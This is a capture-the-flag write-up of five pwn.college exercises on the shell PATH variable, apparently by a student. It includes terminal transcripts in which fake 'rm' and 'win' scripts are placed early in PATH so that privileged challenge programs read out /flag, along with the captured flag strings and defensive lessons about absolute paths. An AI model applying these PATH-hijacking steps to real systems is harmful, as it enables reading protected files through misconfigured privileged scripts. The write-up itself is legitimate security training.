# Pondering PATH
## 1. The PATH Variable
```
hacker@path~the-path-variable:~$ mkdir -p ~/fakebin
hacker@path~the-path-variable:~$ cat > ~/fakebin/rm <<'EOF'
> exit 0
> EOF
hacker@path~the-path-variable:~$ chmod +x ~/fakebin/rm
hacker@path~the-path-variable:~$ PATH="$HOME/fakebin:$PATH" /challenge/run
Trying to remove /flag...
The flag is still there! I might as well give it to you!
pwn.college{QwjeNN67h9tW37Xce4XfZ3A0_iA.QX2cDM1wSMwEzNzEzW}
hacker@path~the-path-variable:~$ 
```
### Steps

I created a directory that I control and placed a fake version of a common command inside it. Then I arranged my environment so that my fake directory appeared earlier in the PATH than system directories. When the challenge invoked the command, my fake command executed instead of the system one, which prevented the challenge from removing the flag and caused it to print the flag to me.

### What I Learned

I learned that the PATH variable defines the search order for executables and that modifying PATH can cause my shell to run different programs than expected. This taught me why it’s important to control the PATH order and why scripts should use absolute paths for security-sensitive operations.

### References

Shell PATH environment variable documentation

Articles on secure PATH handling and command lookup order
## 2. Setting PATH
```
hacker@path~setting-path:~$ ls -l /challenge/more_commands
total 4
-rwsr-xr-x 1 root root 281 Jan 14  2025 win
hacker@path~setting-path:~$ PATH=/challenge/more_commands /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{0JcMPuPZh2ibrI3uJXxyImgBd0t.QX1cjM1wSMwEzNzEzW}
hacker@path~setting-path:~$ 
```
### Steps

I examined where the challenge expected to find helper programs and then set the PATH to point directly at that directory so the program it needed would be found and executed. By providing the correct PATH, the challenge executed the intended helper binary and returned the flag.

### What I Learned

I learned how supplying a custom PATH can be used constructively to ensure the right utilities are invoked, and how programs can be configured to look in specific directories for tools. This reinforced how PATH can be both a convenience and a control mechanism.

### References
same as last one
## 3. Finding Commands
```
hacker@path~finding-commands:~$ dir="$(dirname "$(readlink -f "$(which win)")")"
hacker@path~finding-commands:~$ cat "$dir/flag"
pwn.college{cZEYFqHh5dbEYrV_F6uzKU0OiXT.01NzEzNxwSMwEzNzEzW}
```
### Steps

I resolved which directory contained the command used by the challenge by following symlinks and locating the program’s real path. Once I had the directory, I inspected files colocated with that command to find where the challenge stored the flag and then read it to get the flag.

### What I Learned

I learned how utilities like which and readlink (and the general idea of resolving symlinks) let me find the absolute location of programs. This showed how program installation paths often contain useful related files and how following the filesystem layout can reveal secrets.

### References
idk, just FAFO'd my way

## 4. Addng Commands
```
hacker@path~adding-commands:~$ mkdir -p ~/winbin
hacker@path~adding-commands:~$ cat > ~/winbin/win <<'EOF'
> read -r FLAG </flag
> printf '%s\n' "$FLAG"
> EOF
hacker@path~adding-commands:~$ chmod +x ~/winbin/win
hacker@path~adding-commands:~$ PATH="$HOME/winbin" /challenge/run
Invoking 'win'....
pwn.college{Eo3rtg3EzINKWuyT6leKR19ZGC3.QX2cjM1wSMwEzNzEzW}
hacker@path~adding-commands:~$ 
```
### Steps

I created my own directory of utilities and put a small program in it that printed the flag when invoked. By inserting that directory at the start of my PATH, the challenge invoked my custom program instead of any system utility, and I received the flag.

What I Learned

I learned how easy it is to extend the set of available commands by adding custom scripts to a directory that’s in PATH. This reinforced both the power and the potential danger of order-dependent command lookup: you can add useful shortcuts, but you can also accidentally shadow system tools.

References

Creating executable scripts and adding them to PATH

Security notes on user-installed bin directories in PATH
## 5. Hijacking Commands
```
hacker@path~hijacking-commands:~$ echo "/run/dojo/bin/cat /flag" > rm
hacker@path~hijacking-commands:~$ chmod +x rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{E8rtirteacp307LBLs5qr9woBps.QX3cjM1wSMwEzNzEzW}
hacker@path~hijacking-commands:~$ 
```
### Steps

I wrote a replacement for a commonly used command and made sure my replacement would be found first in the PATH lookup order. When the challenge tried to call the original command, my replacement ran instead and exposed the flag.

### What I Learned

I learned about command hijacking: when a malicious or unintended program appears earlier in PATH, it will be executed in place of the expected program. This illustrated why administrators should avoid putting writable directories early in PATH for privileged users and why scripts should avoid relying on untrusted PATHs.

### References

PATH hijacking and hardening shell environments documentation
